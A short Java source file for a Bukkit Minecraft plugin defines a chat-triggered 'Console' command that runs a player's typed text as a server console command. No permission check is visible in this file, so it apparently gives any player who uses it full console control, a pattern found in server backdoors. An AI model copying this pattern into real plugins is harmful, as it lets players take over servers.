package de.impact.commands.server;

import de.impact.commands.eventhandler.Command;
import de.impact.commands.eventhandler.CommandCategory;
import de.impact.utils.ChatUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class Console extends Command {

    public Console() {
        super("Console", "Console <Message>", "Execute a console command", CommandCategory.SERVER);
    }

    @Override
    public void onChat(String[] aliases, Player p) {

        if(aliases.length < 1) {
            sendUsage(p);
            return;
        }

        StringBuilder chatMessage = new StringBuilder();

        for(String s : aliases)
            chatMessage.append(ChatColor.translateAlternateColorCodes('&', s)).append(" ");

        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), chatMessage.toString().trim());
        ChatUtils.sendMessage(p, "Successfully executed §a" + chatMessage.toString().trim());

    }

}
